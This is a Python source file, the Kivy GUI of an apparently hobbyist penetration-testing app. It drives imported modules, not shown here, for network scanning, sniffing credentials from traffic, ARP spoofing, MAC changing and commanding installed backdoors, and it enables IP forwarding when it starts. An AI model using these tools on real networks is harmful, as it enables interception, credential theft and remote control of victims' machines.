"""Spearky - penetration testing app with GUI developed in Kivy."""

# Imported external modules
import subprocess
import threading
import kivy
from kivy.app import App
from kivy.clock import Clock
from kivy.properties import ObjectProperty
from kivy.uix.label import Label
from kivy.uix.popup import Popup
from kivy.uix.screenmanager import ScreenManager, Screen

# Modules containing the core functionality of the Spearky app.
import core.penetration_tools.mac_changer as mac_changer
import core.detection_tools.network_scanner as network_scanner
from core.detection_tools.packet_sniffer import PacketSniffer
from core.escalation_tools.backdoor_listener import BackdoorListener
from core.penetration_tools.arp_spoofer import ARPSpoofer

# Ensure a proper version of kivy is installed.
kivy.require('1.11.1')


# Python: 3.7

# TODO (medium priority): Implement unit tests, input validation.


# The WindowManager class is responsible for properly changing Screens in the app.
class WindowManager(ScreenManager):
    """Coordinate all the Screens and changes between them throughout the app."""
    pass


class MainMenuScreen(Screen):
    """Display the main menu of the app."""
    pass


class DetectionToolsScreen(Screen):
    """Display all the tools in Detection category."""
    pass


class ScanNetworkScreen(Screen):
    """Scan chosen local network for IP addresses and their associated MAC addresses.

    Attributes:
        ip_network - Text Input for IP address together with a mask
        network_grid - GridLayout object that holds the data with IP and associated MACs

    Methods:
        scan_network() - scan chosen ip range to find and display IP and MAC addresses
    """
    ip_network_input = ObjectProperty(None)
    network_grid = ObjectProperty(None)

    def scan_network(self):
        """Scan network or single IP address using provided IP address and mask."""
        # Clear results table in preparation to printing a new one.
        self.network_grid.clear_widgets()
        # Save ip_network value into separate value.
        ip_network_text = self.ip_network_input.text
        # Clear input field.
        self.ip_network_input.text = ""
        # Perform network scan and save the results into list of dictionaries.
        found_devices = network_scanner.scan(ip_network_text)
        # Display the results in a grid.
        # TODO: Make text of addresses selectable or copy it into clipboard on click.
        for device in found_devices:
            self.network_grid.add_widget(Label(text=device["ip"], font_size=18))
            self.network_grid.add_widget(Label(text=device["mac"], font_size=18))


class SniffPacketsScreen(Screen):
    """Sniff packets asynchronously and find any potential login credentials.

    Attributes:
        interface_input - Text Input for entering network interface
        terminal_output - Text Input for displaying output from terminal
        found_credentials - Text Input for displaying credentials found in terminal's output
        sniffer - PacketSniffer object responsible for starting and stopping sniffing
        update_fields_event - event attribute that controls regular interface updates.

    Methods:
        start_sniffing() - run after pressing "Sniff" Button
        stop_sniffing() - run after pressing "Stop" Button
        update_output_fields(dt) - task scheduled by Clock to update output in the text fields
    """

    # It's important to note that variables below are class' attributes, not instances of the class.
    # This works fine in the case of Kivy.
    # TODO (low priority): Try to use a list of interfaces instead. Some way of getting interface names would be needed.
    # Resource: https://stackoverflow.com/questions/3837069/how-to-get-network-interface-card-names-in-python
    interface_input = ObjectProperty(None)
    terminal_output = ObjectProperty(None)
    found_credentials = ObjectProperty(None)
    sniffer = PacketSniffer()
    update_fields_event = None

    def start_sniffing(self):
        """Start sniffing by either using default interface (eth0) or the one provided by the user."""
        # Clear text fields for displaying output.
        self.terminal_output.text, self.found_credentials.text = "", ""

        # Store inputted interface in a variable.
        interface = self.interface_input.text.strip()
        # Clear text in interface field.
        self.interface_input.text = ""

        # If user provided no variable, use default one (eth0).
        if not interface:
            self.sniffer = PacketSniffer()
        else:
            self.sniffer = PacketSniffer(interface=interface)

        # Start sniffing by calling scapy's AsyncSniffer contained in PacketSniffer object.
        self.sniffer.start_sniffer()

        # Schedule an update of displayed text fields every second.
        self.update_fields_event = Clock.schedule_interval(self.update_output_fields, 1)

        # Display information to user that sniffing has been started.
        print("[+] Sniffing has been started.")
        show_feedback_popup("Packet Sniffing Started", "Sniffing packets has been started.")

    def stop_sniffing(self):
        """Stop sniffing or display message indicating that sniffer hasn't been started yet."""
        # If PacketSniffer is running, stop it, display final output in the text fields
        # and clear PacketSniffer's attributes containing said output.
        # If it isn't running, display appropriate message.
        if self.sniffer.is_running():
            self.update_fields_event.cancel()
            self.sniffer.stop_sniffer()
            print("[+] Sniffing has been stopped.")
            self.terminal_output.text += "\n".join(self.sniffer.console_output) + "\n"
            self.found_credentials.text += "\n".join(self.sniffer.credentials) + "\n"
            self.sniffer.console_output, self.sniffer.credentials = [], []
            show_feedback_popup("Packet Sniffing Stopped", "Packet sniffing has been stopped.")
        else:
            show_feedback_popup("Packet Sniffing Warning",
                                "Packet sniffing has not yet started. It can't be stopped.")

    def update_output_fields(self, dt):
        """Update output fields with found information and clear PacketSniffer's attributes.

        Attributes:
            dt - delta time, required and used by Clock
        """
        # If there's content stored in console_output, display it in the text fields.
        if self.sniffer.console_output:
            self.terminal_output.text += "\n".join(self.sniffer.console_output) + "\n"
            self.sniffer.console_output = []
        # If there's content stored in credentials, display it in the text fields.
        if self.sniffer.credentials:
            self.found_credentials.text += "\n".join(self.sniffer.credentials) + "\n"
            self.sniffer.credentials = []


class EscalationToolsScreen(Screen):
    """Display all the tools in Escalation category."""
    pass


# TODO: Add documentation here.
class BackdoorListenerScreen(Screen):
    """Listen for incoming connections from installed backdoors."""
    ip_address_input = ObjectProperty(None)
    port_input = ObjectProperty(None)
    terminal = ObjectProperty(None)
    command_line = ObjectProperty(None)
    backdoor_thread = threading.Thread()
    backdoor_listener = object
    update_field_event = None
    # This attribute tracks whether BackdoorListener is alive or not.
    backdoor_running = False

    def start_listener(self):
        if not self.backdoor_running:
            # Store ip_address and port into separate variables.
            ip_address, port = self.ip_address_input.text, self.port_input.text
            # Clear terminal, command_line and input widgets contents.
            self.terminal.text, self.command_line.text, self.ip_address_input.text, self.port_input.text = "", "", "", ""
            # Call thread to initialize and run BackdoorListener.
            self.backdoor_running = True
            self.backdoor_thread = threading.Thread(target=self.initialize_listener, args=(ip_address, port))
            self.backdoor_thread.start()
            self.terminal.text += "[+] Waiting for incoming connection...\n"
        else:
            show_feedback_popup("Backdoor Listener Error",
                                "The Backdoor Listener has already been started. Stop the process first.")

    # TODO: If listener is stopped before connecting, it freezes.
    def stop_listener(self):
        if self.backdoor_running:
            # TODO: untested line, check later.
            self.backdoor_listener.run_command("exit")
            self.backdoor_thread.join()
            # Cancel scheduled event of updating terminal.
            self.update_field_event.cancel()
            # Close the connection between backdoor and listener.
            self.backdoor_listener.connection.close()
            self.backdoor_running = False
            self.terminal.text += "[+] Backdoor listener process has been stopped."
            print("[+] Backdoor listener process has been stopped.")
        else:
            show_feedback_popup("Backdoor Listener Error",
                                "The Backdoor Listener cannot be stopped. It hasn't yet started.")

    def initialize_listener(self, ip_address, port):
        # Create BackdoorListener instance.
        if port:
            self.backdoor_listener = BackdoorListener(ip_address, int(port))
        else:
            self.backdoor_listener = BackdoorListener(ip_address)
        # Run listener.
        self.update_field_event = Clock.schedule_interval(self.update_terminal_field, 1)

    def update_terminal_field(self, dt):
        """Update terminal with found information and clear BackdoorListener's attributes.

        Attributes:
            dt - delta time, required and used by Clock
        """
        # If there's content stored in terminal, display it in the text field.
        if self.backdoor_listener.terminal:
            self.terminal.text += "\n".join(self.backdoor_listener.terminal) + "\n"
            self.backdoor_listener.terminal = []

    # TODO: Implement so pressing enter in the text field automatically runs this.
    def send_command(self):
        """Send the command the user has entered to target's device."""
        self.backdoor_listener.run_command(self.command_line.text)
        self.command_line.text = ""


class PenetrationToolsScreen(Screen):
    """Display all the tools in Penetration category."""
    pass


class ChangeMACScreen(Screen):
    """Change current MAC address to the one inputted. Display default MAC address and possibly, revert the changes.
    
    Attributes:
       mac_input - TextInput for entering MAC address
        interface_input - TextInput for entering interface
        original_mac - Label which holds the default MAC address
        current_mac - MAC address currently in use on the provided interface

    Methods:
        submit_mac() - perform the change of the MAC using user's input
        revert_mac() - revert MAC address on the used interface to default one
    """
    # Initialize Widgets of the class taken from .kv file.
    mac_input = ObjectProperty(None)
    interface_input = ObjectProperty(None)
    original_mac = ObjectProperty(None)
    current_mac = ObjectProperty(None)

    # Default value for interface.
    current_interface = "eth0"

    def submit_mac(self):
        """Take strings from input fields and use them as arguments for performing MAC address change."""
        # Store inputs in additional variables to allow us to clear Text Inputs instantly.
        interface, mac_address = self.interface_input.text.strip(), self.mac_input.text.strip()
        # Store additional message for when default interface is used.
        default_interface_message = ""

        # If there was interface provided, store it in class' instance.
        if interface:
            self.current_interface = interface
        # If there wasn't, make sure to inform user about what kind of interface was used.
        else:
            default_interface_message = f"\nDefault interface ({self.current_interface}) was used."

        # Clear out input text fields.
        self.mac_input.text = ""
        self.interface_input.text = ""

        # Change the Label's text of current MAC address while performing said change.
        self.current_mac.text = mac_changer.perform_mac_change(self.current_interface, mac_address)
        show_feedback_popup("MAC Change Successful", "MAC change performed successfully." + default_interface_message)

    def revert_mac(self):
        """Restores computer's MAC address to the original one."""
        self.mac_input.text = ""
        self.interface_input.text = ""

        print("[+] Reverting MAC address...")

        # Change the Label's text of current MAC address while performing said change.
        self.current_mac.text = mac_changer.perform_mac_change(self.current_interface, self.original_mac.text)
        show_feedback_popup("MAC Reversing Successful", "MAC address has been restored to the original one.")


class SpoofARPScreen(Screen):
    """Spoof ARP table and display the process' status to the user.
    
    Attributes:
        target_input - Text Input for IP address of target's device
        gateway_input - Text Input for IP address of network's gateway
        status - Label responsible for displaying information about process' status
        spoofing_thread - separate thread, delegated to performing spoofing in the background
        spoofer - ARPSpoofer object that does the operation of forging packets, required for spoofing
    
    Methods:
        start_spoofing() - start spoofing based on given input
        stop_spoofing() - try to stop spoofing if possible and display appropriate feedback
    """
    target_input = ObjectProperty(None)
    gateway_input = ObjectProperty(None)
    status = ObjectProperty(None)
    spoofing_thread = threading.Thread()
    spoofer = ARPSpoofer()

    def start_spoofing(self):
        """Start spoofing ARP table between chosen targets and display information it started."""
        # Change text and color of status for visual feedback.
        self.status.text = "running..."
        self.status.color = (0, 0, 0, 1)  # black
        self.status.background_color = (0, 1, 0, 1)  # green
        # Save target's IP and gateway's IP into variables, cutting spaces.
        target, gateway = self.target_input.text.strip(), self.gateway_input.text.strip()
        # Clear Text Input fields.
        self.target_input.text = ""
        self.gateway_input.text = ""
        # If there was target and gateway provided, perform spoofing.
        # TODO: If there's no gateway, use default one (ending with .1).
        if target and gateway:
            self.spoofer = ARPSpoofer(target, gateway)
            self.spoofing_thread = threading.Thread(target=self.spoofer.start)
            self.spoofing_thread.start()
        # Otherwise, show an error Popup message and change status.
        else:
            show_feedback_popup("ARP Spoofing Error", "IP addresses have not been provided correctly.")
            self.status.text = "ERROR"
            self.status.background_color = (1, 0, 0, 1)  # red

    def stop_spoofing(self):
        """Stop spoofing ARP table between chosen targets and display information it stopped."""
        # Inform about ongoing process of stopping the spoofing.
        self.status.text = "stopping.."
        self.status.color = (0, 0, 0, 1)  # black
        self.status.background_color = (245 / 255, 171 / 255, 53 / 255, 1)  # orange
        # Call method to stop spoofing if its running.
        if self.spoofer.running:
            # Call joining the spoofer_thread on separate thread to allow for GUI update on the main thread.
            threading.Thread(target=self.join_spoofing_thread).start()
        else:
            show_feedback_popup("ARP Spoofing Stop", "ARP spoofing has not been started yet.")

    def join_spoofing_thread(self):
        # Call method to stop spoofing.
        self.spoofer.stop()
        # Call a thread to join with the main thread.
        self.spoofing_thread.join()
        # Display information indicating successful halt of spoofing.
        self.status.text = "stopped"
        self.status.color = (1, 1, 1, 1)  # white
        self.status.background_color = (0, 0, 0, 1)  # black


class SpearkyApp(App):
    """Root class that represents the whole App."""
    pass


class FeedbackPopup(Popup):
    """Generic Popup that is used to provide user with feedback."""
    feedback_text = ObjectProperty(None)


def show_feedback_popup(title, content_text, size=(350, 200)):
    """Create FeedbackPopup based on provided arguments and display it."""
    popup = FeedbackPopup(title=title, size_hint=(None, None), size=size)
    popup.feedback_text.text = content_text
    popup.open()


# Execute to start the app with preconfigured packets forwarding.
if __name__ == '__main__':
    subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    SpearkyApp().run()
